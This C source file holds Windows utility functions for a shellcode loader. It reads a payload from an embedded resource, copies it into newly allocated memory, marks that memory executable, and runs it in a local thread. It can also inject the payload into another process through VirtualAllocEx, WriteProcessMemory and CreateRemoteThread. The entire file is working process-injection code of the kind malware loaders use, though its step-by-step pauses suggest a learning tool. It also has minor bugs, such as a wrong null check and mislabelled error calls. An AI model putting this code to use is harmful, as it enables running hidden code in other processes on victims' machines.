#include <windows.h>
#include <stdio.h>
#include "utility.h"


int getResourceAddr(LPVOID *resAddr, DWORD *resSize, int intResource){

    HRSRC   res;
    HGLOBAL resLoaded;

    res = FindResource(NULL, MAKEINTRESOURCE(intResource), RT_RCDATA);
    if (res == NULL){
        MESSAGE(FAIL, "Impossible to find resource\n");
        PRINT_ERROR(FindResource);
        exit(EXIT_FAILURE);
    }
    resLoaded = LoadResource(NULL, res);
    if (resLoaded == NULL){
        MESSAGE(FAIL, "Impossible to load resource\n");
        PRINT_ERROR(LoadResource);
        exit(EXIT_FAILURE);
    } 
    *resAddr = (LPVOID)LockResource(resLoaded);
    if (resAddr == NULL){
        MESSAGE(FAIL, "Impossible to lock resource\n");
        PRINT_ERROR(lockResource);
        exit(EXIT_FAILURE);
    }
    *resSize = SizeofResource(NULL, res);

    return EXIT_SUCCESS;
}



int allowAndExecute(LPVOID codeAddr, DWORD codeSize){

    DWORD   oldProtection;
    HANDLE  threadHandle;

    if (VirtualProtect(codeAddr, codeSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in the current process\n");
        PRINT_ERROR(VirtualProtect);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Permission changed successfully at: 0x%p\n", codeAddr);

    // Run code
    MESSAGE(INFO, "Press <enter> to execute the code...");
    getchar();
    //((void(*)())codeAddr)();
    threadHandle = CreateThread(NULL, codeSize, (LPTHREAD_START_ROUTINE)codeAddr, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread\n");
        PRINT_ERROR(CreateThread);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Thread started\n");

    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);
    
    return EXIT_SUCCESS;
}



int allowAndExecuteRemote(HANDLE  processHandle, LPVOID remoteAddr, DWORD codeSize){

    DWORD   oldProtection;
    HANDLE  threadHandle;

    if (VirtualProtectEx(processHandle, remoteAddr, codeSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of space on the remote process\n");
        PRINT_ERROR(WriteProcessMemory);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Permission successfully changed to ERW at 0x%p\n", remoteAddr);

    MESSAGE(INFO, "Press <enter> to run the code...");
    getchar();
    // Create thread to run the code remotly
    threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread in the remote process\n");
        PRINT_ERROR(CreateRemoteThread);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Thread started\n");

    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);

    return EXIT_SUCCESS;
}



int allocateAndCopy(LPCVOID code, DWORD codeSize, LPVOID * remoteAddr){


    // Allocate bytes to process memory
    *remoteAddr = VirtualAlloc(NULL, codeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (*remoteAddr == NULL){
        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory\n", codeSize);
        PRINT_ERROR(VirtualAlloc);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "%ld bytes of memory successfully allocated\n", codeSize);
    MESSAGE(INFO, "Press <enter> to copy data...");
    getchar();
    // Write bytes(shellcode) to the allocated memory
    memcpy(*remoteAddr, code, codeSize);
    
    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory\n", codeSize);

    return EXIT_SUCCESS;
}



int allocateAndCopyRemote(HANDLE processHandle, LPCVOID code, DWORD codeSize, LPVOID * remoteAddr){


    // Allocate bytes to process memory
    *remoteAddr = VirtualAllocEx(processHandle, NULL, codeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (*remoteAddr == NULL){
        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in the remote process\n", codeSize);
        PRINT_ERROR(VirtualAllocEx);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in the remote process\n", codeSize);
    MESSAGE(INFO, "Press <enter> to copy data...");
    getchar();
    // Write bytes(shellcode) to process allocated memory
    if (WriteProcessMemory(processHandle, *remoteAddr, code, codeSize, NULL) == 0){
        MESSAGE(FAIL, "Impossible to write data to the remote process\n");
        PRINT_ERROR(WriteProcessMemory);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of the remote process\n", codeSize);

    return EXIT_SUCCESS;
}